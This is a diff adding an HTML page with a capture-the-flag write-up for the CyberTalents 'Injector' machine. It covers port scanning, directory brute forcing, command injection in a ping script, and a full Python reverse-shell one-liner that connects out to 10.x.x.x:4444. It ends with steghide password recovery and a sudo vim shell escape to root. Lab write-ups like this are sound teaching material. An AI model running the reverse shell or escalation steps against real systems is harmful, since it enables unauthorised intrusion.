@@ -1,1 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>CyberTalents Injector Machine Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Inconsolata&display=swap" rel="stylesheet">
+<style>
+    body {
+        background: #0f0f0f;
+        color: #ccc;
+        font-family: 'Inconsolata', monospace;
+        line-height: 1.6;
+        padding: 20px;
+        max-width: 800px;
+        margin: auto;
+    }
+    h1, h2, h3 {
+        color: #00ff88;
+        text-align: center;
+    }
+    img.logo {
+        display: block;
+        margin: 20px auto;
+        width: 200px;
+    }
+    pre {
+        background: #111;
+        padding: 15px;
+        border-left: 4px solid #00ff88;
+        overflow-x: auto;
+    }
+    a {
+        color: #00d4ff;
+        text-decoration: none;
+    }
+    a:hover {
+        color: #ff4081;
+    }
+</style>
+</head>
+<body>
+
+<h1>CyberTalents Injector Machine Writeup</h1>
+<img src="https://cybertalents.com/images/logo-footer.png" alt="CyberTalents Logo" class="logo">
+
+<p><strong>3 minute read</strong></p>
+
+<h2>Overview</h2>
+<p>Injector machine is an easy box with some good ideas.</p>
+<p>By the way, I couldn’t solve the machine through the VPN because of some problems, but I solved the machine through its public IP which is <code>3.127.234.70</code>.</p>
+
+<h2>Methodology</h2>
+<ul>
+    <li>Enumeration</li>
+    <li>Exploiting Command Injection Vulnerability</li>
+    <li>Privilege Escalation</li>
+</ul>
+
+<h3>Nmap Scan</h3>
+<pre>
+# Nmap 7.91 scan initiated
+nmap -sV -sC -oN nmap 3.127.234.70
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</pre>
+
+<p>Found two open ports:</p>
+<ul>
+    <li>22/tcp - SSH</li>
+    <li>80/tcp - HTTP</li>
+</ul>
+
+<h3>Web Server</h3>
+<p>Default Apache page. Nothing interesting. Let's do directory brute force:</p>
+
+<pre>
+gobuster dir -u http://3.127.234.70/ -w /usr/share/dirb/wordlists/common.txt
+</pre>
+
+<p>Found <code>/secret</code> directory, but still nothing interesting. Tried again:</p>
+
+<pre>
+gobuster dir -u http://3.127.234.70/secret/ -w /usr/share/dirb/wordlists/common.txt
+</pre>
+
+<p>Found:</p>
+<ul>
+    <li>/company</li>
+    <li>/admin.html</li>
+    <li>/root</li>
+    <li>/test</li>
+    <li>/tools</li>
+</ul>
+
+<p>In <code>/tools</code>, found <code>ping.php</code> - a pinging script vulnerable to <strong>Command Injection</strong>.</p>
+
+<h3>Reverse Shell</h3>
+<p>Executed this one-liner:</p>
+
+<pre>
+python -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.x.x.x",4444));
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+import pty; pty.spawn("/bin/bash")'
+</pre>
+
+<p>Got shell as <code>www-data</code>.</p>
+
+<h2>Privilege Escalation</h2>
+<p>Found a <code>TrollFace.jpg</code> in <code>/var/www</code>.</p>
+
+<p>Used <code>steghide</code> and got a password.</p>
+
+<p>Switched to user <code>alex</code> using the password.</p>
+
+<p>Then found that <code>vim</code> can be run with sudo:</p>
+
+<pre>
+sudo vim -c ':! /bin/sh'
+</pre>
+
+<p>And we got root!</p>
+
+<h2>Rooted ✅</h2>
+<p>If you have any questions, DM me on Facebook.</p>
+
+</body>
+</html>
 
